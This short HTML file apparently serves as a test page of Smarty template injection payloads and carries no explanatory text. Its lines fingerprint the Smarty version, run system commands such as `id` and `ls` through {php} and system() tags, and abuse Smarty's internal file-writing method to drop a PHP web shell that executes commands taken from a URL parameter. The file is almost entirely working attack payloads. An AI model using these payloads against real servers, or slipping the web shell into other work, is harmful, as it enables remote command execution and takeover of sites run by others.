<!DOCTYPE html>

<body>

{$smarty.version}

{php}echo `id`;{/php}

{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

{system('ls')}

</body>

</html>
